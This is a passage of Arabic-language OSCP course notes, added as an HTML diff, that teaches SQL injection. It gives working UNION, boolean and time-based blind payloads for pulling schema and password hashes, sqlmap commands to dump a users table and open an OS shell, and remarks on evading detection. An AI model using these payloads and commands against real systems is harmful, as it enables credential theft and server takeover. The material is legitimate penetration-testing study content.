+<p>بمجرد ما حقن UNION بيشتغل، المهاجمين يقدروا يستكشفوا ميتاداتا قاعدة البيانات المخزَّنة في جداول النظام. معظم قواعد البيانات العلائقية بتحافظ على كتالوج اسمه <code>information_schema</code>، بيحتوي تفاصيل عن الجداول والأعمدة:</p>
+<div class="code-wrap"><pre><code class="language-sql">' UNION SELECT null, table_name, column_name, table_schema, null
+FROM information_schema.columns
+WHERE table_schema = database() -- //
+</code></pre></div>
+<p>ده بيكشف: أسماء الجداول | أسماء الأعمدة | قاعدة البيانات المرتبطة. من خلال العملية دي، المهاجمين يقدروا يرسموا خريطة لبنية قاعدة البيانات الهدف بالكامل.</p>
+<h3>استخراج بيانات حساسة من الجداول</h3>
+<p>بعد تحديد جداول قيّمة (مثلًا جدول <code>users</code>)، المهاجمين يقدروا يسترجعوا السجلات المخزَّنة:</p>
+<div class="code-wrap"><pre><code class="language-sql">' UNION SELECT null, username, password, description, null 
+FROM users -- //
+</code></pre></div>
+<p>لو نجح، التطبيق هيعرض أسماء المستخدمين وhashes الباسوردات. الـ hashes دي (زي قيم MD5) بتمثّل نسخ مُرمَّزة من الباسوردات — المهاجمين ممكن يحاولوا يكسروها أوفلاين باستخدام أدوات متخصصة.</p>
+<blockquote>
+<p>حقن UNION-based قوي لأنه بيسمح للمهاجمين: يدمجوا استعلامات خبيثة مع استعلامات شرعية | يعدّوا بنية قاعدة البيانات | يستخرجوا معلومات حساسة مباشرة عبر واجهة التطبيق</p>
+</blockquote>
+<hr />
+<h3>حقن SQL الأعمى (Blind SQL Injection)</h3>
+<p>في السيناريوهات السابقة، الاستعلامات المحقونة رجّعت نتائج قاعدة البيانات مباشرة عبر واجهة التطبيق (in-band). لكن بعض التطبيقات بتقمع أخطاء ومخرجات قاعدة البيانات، مخلّية الاستخراج المباشر مستحيل.</p>
+<blockquote>
+<p><strong>Blind SQL Injection</strong> بتحصل لما التطبيق مابيعرضش نتائج الاستعلام، مجبرة المهاجم يستنتج معلومات بشكل غير مباشر بملاحظة سلوك التطبيق. بدل ما يشوف بيانات قاعدة البيانات، المهاجم بيحلل إزاي التطبيق بيرد على مدخلات مصمَّمة.</p>
+</blockquote>
+<h3>1. Boolean-Based Blind SQL Injection</h3>
+<p>التقنية دي بتعتمد على إرسال شروط بتُقيَّم كـ <code>TRUE</code> أو <code>FALSE</code> وملاحظة اختلافات في رد التطبيق. حتى لو خرج قاعدة البيانات مخفي، سلوك التطبيق بيكشف هل الشرط اتحقق.</p>
+<p><strong>إزاي بتشتغل:</strong></p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>الشرط</th>
+<th>سلوك الصفحة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>صحيح (TRUE)</strong></td>
+<td>الصفحة بتعرض محتوى عادي، البيانات بتظهر كالمتوقَّع</td>
+</tr>
+<tr>
+<td><strong>خاطئ (FALSE)</strong></td>
+<td>الصفحة بتتغيّر، المحتوى بيختفي، أو خطأ/نتيجة فاضية بتظهر</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>مثال Payload:</strong></p>
+<div class="code-wrap"><pre><code class="language-sql">?user=BadGlitch' AND 1=1 -- //
+</code></pre></div>
+<p><code>1=1</code> دايمًا TRUE — التطبيق بيتصرف بشكل عادي لو السجل موجود. دلوقتي قارن بـ:</p>
+<div class="code-wrap"><pre><code class="language-sql">?user=BadGlitch' AND 1=2 -- //
+</code></pre></div>
+<p><code>1=2</code> دي FALSE — رد التطبيق بيتغيّر. باستبدال الشروط باستعلامات (مثلًا فحص حروف باسورد)، المهاجمين يقدروا يعيدوا بناء بيانات مخفية قطعة قطعة.</p>
+<blockquote>
+<p><strong>ليه لسه معتبرة "عمياء":</strong> المهاجم عمره ما بيستقبل خرج قاعدة بيانات خام. كل الاستنتاجات جاية من ملاحظة السلوك الظاهر لتطبيق الويب، مش نتائج استعلام مباشرة.</p>
+</blockquote>
+<h3>2. Time-Based Blind SQL Injection</h3>
+<p>لما التطبيقات بترجّع ردود متطابقة لحالتي TRUE وFALSE، المهاجمين بيستخدموا التوقيت (timing) كقناة جانبية. في الطريقة دي، الاستعلام المحقون بيوجّه قاعدة البيانات توقف التنفيذ لو شرط معين صحيح.</p>
+<p><strong>مثال Payload:</strong></p>
+<div class="code-wrap"><pre><code class="language-sql">?user=BadGlitch' AND IF(1=1, SLEEP(3), 'false') -- //
+</code></pre></div>
+<p><strong>الشرح:</strong> لو الشرط TRUE → قاعدة البيانات بتستنى 3 ثواني. لو FALSE → الرد فوري. بقياس وقت الرد، المهاجم بيحدد هل الشرط اتحقق.</p>
+<h3>حالة استخدام عملية</h3>
+<p>افترض إن التطبيق بيسترجع تفاصيل مستخدم بناءً على باراميتر URL:</p>
+<div class="code-wrap"><pre><code>blindsqli.php?user=BadGlitch
+</code></pre></div>
+<p>الصفحة بتعرض: اسم المستخدم | hash الباسورد | وصف. بما إن الباراميتر مُضمَّن في استعلام قاعدة بيانات، بيبقى نقطة حقن.</p>
+<p><strong>اختبار Boolean:</strong></p>
+<div class="code-wrap"><pre><code class="language-sql">?user=BadGlitch' AND 1=1 -- //
+</code></pre></div>
+<p>لو الصفحة لسه بتعرض بيانات المستخدم → الشرط TRUE.</p>
+<p><strong>اختبار التوقيت:</strong></p>
+<div class="code-wrap"><pre><code class="language-sql">?user=BadGlitch' AND IF(1=1, SLEEP(3), 'false') -- //
+</code></pre></div>
+<p>لو الصفحة اتأخّرت → الشرط TRUE.</p>
+<h3>ليه Blind SQL Injection قوية</h3>
+<p>حتى من غير خرج ظاهر، المهاجمين لسه يقدروا: يعدّوا أسماء قواعد البيانات | يكتشفوا بنية الجداول | يستخرجوا اعتمادات حرف بحرف</p>
+<blockquote>
+<p>العملية أبطأ من أنواع SQLi التانية لأن كل قطعة معلومة محتاجة طلبات متعددة.</p>
+</blockquote>
+<h3>الأتمتة</h3>
+<p>بما إن التقنيات العمياء بتشمل اختبار متكرر، مختبري الاختراق غالبًا بيؤتمتوها باستخدام أدوات زي <code>sqlmap</code>، اللي تقدر تستخرج بيانات بشكل منهجي عبر تحليل boolean أو timing.</p>
+<blockquote>
+<p>Blind SQL injection بتوضّح إن إخفاء أخطاء قاعدة البيانات لوحده مابيلغيش الخطر. التطبيقات لازم كمان: تستخدم parameterized queries | تتحقق من المدخل بشكل سليم | تطبّق صلاحيات قاعدة بيانات بأقل الصلاحيات</p>
+</blockquote>
+<p>وإلا، المهاجمين لسه يقدروا يكشفوا بيانات حساسة عبر قنوات غير مباشرة.</p>
+<hr />
+<h2 id="lu3"><span class="num">03</span><span class="htext">طرق الاستغلال الآلي (Manual and Automated Code Execution)</span></h2>
+<h3>أهداف الوحدة</h3>
+<p>تحقيق تنفيذ أوامر نظام التشغيل عبر Microsoft SQL Server | استخدام أدوات آلية لتسريع هجمات SQL injection | فهم إزاي عيوب قاعدة البيانات ممكن تؤدي لاختراق نظام كامل</p>
+<p>ثغرات SQL injection ممكن تمتد أبعد بكتير من استخراج البيانات. تحت ظروف معينة — حسب نظام التشغيل، صلاحيات قاعدة البيانات، وصلاحيات الملفات — المهاجم ممكن يكتسب القدرة على التفاعل مباشرة مع السيرفر الأساسي.</p>
+<p>التقنيات اليدوية المستخدَمة لاستغلال SQL injection ممكن تكون مستهلكة للوقت وعرضة للأخطاء. مختبري الأمان غالبًا بيعتمدوا على أدوات أتمتة لتسريع الاكتشاف والاستغلال، خاصةً لما بنتعامل مع سيناريوهات حقن معقَّدة أو عمياء.</p>
+<blockquote>
+<p>واحدة من أكتر الأدوات استخدامًا لهذا الغرض هي <strong>sqlmap</strong>، اللي بتيجي متضمَّنة مسبقًا في توزيعات اختبار اختراق زي Kali Linux.</p>
+</blockquote>
+<h3>اكتشاف نقاط الحقن آليًا</h3>
+<p>الخطوة الأولى هي اختبار هل باراميتر ويب عرضة للخطر. فحص أساسي بيشمل تحديد الـ URL المستهدف وتحديد الباراميتر المراد اختباره:</p>
+<div class="code-wrap"><pre><code class="language-bash">sqlmap -u &quot;http://target/blindsqli.php?user=1&quot; -p user
+</code></pre></div>
+<h3>إيه اللي بيحصل أثناء الفحص</h3>
+<p>الأداة هـ:</p>
+<div class="code-wrap"><pre><code>1. تبعت payloads مصمَّمة
+2. تحلل ردود السيرفر
+3. تحدد تقنية الحقن
+4. تعمل fingerprint لقاعدة البيانات الخلفية
+</code></pre></div>
+<p><strong>النتائج النموذجية ممكن تشمل:</strong> نوع الحقن (مثلًا time-based blind) | محرك قاعدة البيانات (MySQL، MSSQL...إلخ) | نظام تشغيل سيرفر الويب | لغة البرمجة والـ framework</p>
+<blockquote>
+<p>مرحلة الاستطلاع دي حرجة لأنها بتحدد أنهي استراتيجيات هجوم قابلة للتطبيق.</p>
+</blockquote>
+<h3>استخراج محتويات قاعدة البيانات</h3>
+<p>بعد تأكيد ثغرة، الخطوة الجاية هي استخراج البيانات. أدوات الأتمتة تقدر تعدّ: أسماء قواعد البيانات | الجداول | الأعمدة | السجلات المخزَّنة</p>
+<div class="code-wrap"><pre><code class="language-bash"># سرد قواعد البيانات
+sqlmap -u &quot;http://target/blindsqli.php?user=1&quot; -p user --dbs
+
+# سرد الجداول في قاعدة بيانات محددة
+sqlmap -u &quot;http://target/blindsqli.php?user=1&quot; -p user -D target_db --tables
+
+# dump محتوى جدول كامل، بما فيه اعتمادات المستخدمين
+sqlmap -u &quot;http://target/blindsqli.php?user=1&quot; -p user -D target_db -T users --dump
+</code></pre></div>
+<blockquote>
+<p>استخدام خيار الـ dump بيسمح باسترجاع مجموعات بيانات كاملة، بما فيها اعتمادات المستخدمين. سيناريوهات الحقن الأعمى — خاصةً الـ time-based — ممكن تكون بطيئة لأن كل بت معلومة محتاج طلبات متعددة للتأكيد.</p>
+</blockquote>
+<h3>اعتبارات تشغيلية</h3>
+<p>الأدوات الآلية بتولّد حجم كبير من الترافيك وأنماط مميَّزة. ده بيخليها سهلة الاكتشاف من: أنظمة كشف التسلل (IDS) | Web Application Firewalls | فرق المراقبة الأمنية</p>
+<blockquote>
+<p>عشان كده، الأتمتة ممكن متكونش مناسبة لما التخفّي مطلوب. التقنيات اليدوية بتفضل قيّمة للتهرّب والدقة.</p>
+</blockquote>
+<h3>أتمتة الهجمات ضد طلبات POST</h3>
+<p>مش كل الثغرات بتتعرض عبر باراميترات URL — بعضها موجود في تقديمات نماذج باستخدام طلبات POST. لتحليل دي:</p>
+<div class="code-wrap"><pre><code>1. التقط طلب HTTP باستخدام أداة proxy
+2. احفظه في ملف
+3. قدّم الملف لأداة الأتمتة
+</code></pre></div>
+<div class="code-wrap"><pre><code class="language-bash">sqlmap -r request.txt -p username
+</code></pre></div>
+<p>ده بيسمح باختبار باراميترات مخفية ووظائف موثَّقة.</p>
+<h3>الحصول على تنفيذ أوامر عن بُعد (RCE)</h3>
+<p>ميزات متقدمة تقدر تصعّد اختراق قاعدة بيانات لتحكم كامل في السيرفر. أدوات الأتمتة ممكن تحاول:</p>
+<div class="code-wrap"><pre><code>1. كتابة ملفات خبيثة في دليل الويب
+2. نشر webshell
+3. توفير shell تفاعلي لنظام التشغيل
+</code></pre></div>
+<div class="code-wrap"><pre><code class="language-bash">sqlmap -u &quot;http://target/blindsqli.php?user=1&quot; -p user --os-shell
+</code></pre></div>
+<p>بمجرد النجاح، المهاجم يقدر ينفّذ أوامر نظام عن بُعد، شبه امتلاك وصول terminal. <strong>القدرات النموذجية بتشمل:</strong> عرض معلومات النظام | التنقّل بين الأدلة | إدارة الملفات | تشغيل أوامر إدارية</p>
+<blockquote>
+<p>في المرحلة دي، الهجوم بيتخطى استغلال قاعدة البيانات لاستيلاء كامل على النظام.</p>
+</blockquote>
+<p>الأتمتة بتسرّع استغلال SQL injection بشكل كبير، ماكّنة المهاجمين أو المختبرين من: اكتشاف ثغرات بسرعة | عدّ قواعد البيانات بكفاءة | تحقيق تنفيذ عن بُعد</p>
+<p>لكن الاعتماد حصريًا على الأتمتة ممكن يكون خطير بسبب الضوضاء وقابلية الاكتشاف. المختبر الماهر بيجمع بين: فهم يدوي | صياغة payloads دقيقة | استخدام استراتيجي للأدوات الآلية</p>
+<hr />
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>في الموديول ده، ركّزنا على تحديد وعدّ ثغرات SQL injection. استكشفنا الـ payloads المختلفة اللي ممكن تُستغل لإساءة استخدام ثغرات تطبيقات الويب دي، واكتشفنا إزاي نحقق تنفيذ كود يدويًا. أخيرًا، اتعلّمنا إزاي نؤتمت سلسلة الهجوم بالكامل باستخدام <code>sqlmap</code>.</p>
+<hr />
+<p><em>نهاية نوتس الموديول الثامن — OSCP: SQL Injection Attacks</em></p>
+  <div class="footer-note">-- EOF: module-08/sql-injection-attacks.md --</div>
+
+</div>
+</body>
+</html>
